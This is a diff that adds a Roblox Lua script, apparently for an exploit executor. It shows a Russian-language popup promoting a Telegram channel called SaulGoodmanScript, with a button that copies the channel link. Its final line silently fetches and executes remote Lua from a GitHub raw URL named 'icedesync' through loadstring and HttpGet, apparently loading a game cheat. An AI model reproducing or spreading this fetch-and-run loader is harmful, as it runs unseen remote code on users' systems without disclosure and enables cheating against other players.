@@ -1,0 +1,117 @@
+local function CreateTGCopyGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "SaulTGCopier"
+    screenGui.Parent = game.CoreGui
+
+    -- Главный фрейм
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 350, 0, 200)
+    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = mainFrame
+
+    -- Верхняя панель
+    local topBar = Instance.new("Frame")
+    topBar.Size = UDim2.new(1, 0, 0, 40)
+    topBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    topBar.BorderSizePixel = 0
+    topBar.Parent = mainFrame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 1, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "📢 SaulGoodmanScript"
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.Parent = topBar
+
+    -- Текст с призывом
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Size = UDim2.new(1, -20, 0, 60)
+    messageLabel.Position = UDim2.new(0, 10, 0, 50)
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.Text = "Подпишись на канал чтобы не пропустить новые скрипты! 🚀"
+    messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    messageLabel.Font = Enum.Font.Gotham
+    messageLabel.TextSize = 14
+    messageLabel.TextWrapped = true
+    messageLabel.Parent = mainFrame
+
+    -- Поле со ссылкой
+    local linkBox = Instance.new("TextBox")
+    linkBox.Size = UDim2.new(1, -20, 0, 30)
+    linkBox.Position = UDim2.new(0, 10, 0, 120)
+    linkBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    linkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    linkBox.Text = "t.me/SaulGoodmanScript"
+    linkBox.Font = Enum.Font.Gotham
+    linkBox.TextSize = 13
+    linkBox.Parent = mainFrame
+
+    local linkCorner = Instance.new("UICorner")
+    linkCorner.CornerRadius = UDim.new(0, 4)
+    linkCorner.Parent = linkBox
+
+    -- Кнопка копирования
+    local copyBtn = Instance.new("TextButton")
+    copyBtn.Size = UDim2.new(1, -20, 0, 35)
+    copyBtn.Position = UDim2.new(0, 10, 0, 160)
+    copyBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 255)
+    copyBtn.Text = "📋 Скопировать ссылку на канал"
+    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    copyBtn.Font = Enum.Font.GothamBold
+    copyBtn.TextSize = 14
+    copyBtn.Parent = mainFrame
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = copyBtn
+
+    -- Обработчик копирования
+    copyBtn.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard("t.me/SaulGoodmanScript")
+            copyBtn.Text = "✅ Скопировано!"
+            copyBtn.BackgroundColor3 = Color3.fromRGB(100, 220, 100)
+
+            wait(2)
+            copyBtn.Text = "📋 Скопировать ссылку на канал"
+            copyBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 255)
+        else
+            copyBtn.Text = "❌ Ошибка копирования"
+        end
+    end)
+
+    -- Кнопка закрытия
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0, 25, 0, 25)
+    closeBtn.Position = UDim2.new(1, -30, 0, 8)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+    closeBtn.Text = "X"
+    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 12
+    closeBtn.Parent = topBar
+
+    local closeCorner = Instance.new("UICorner")
+    closeCorner.CornerRadius = UDim.new(1, 0)
+    closeCorner.Parent = closeBtn
+
+    closeBtn.MouseButton1Click:Connect(function()
+        screenGui:Destroy()
+    end)
+
+    return screenGui
+end
+
+CreateTGCopyGUI()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nootmaus/icedesync/refs/heads/main/.lua"))()
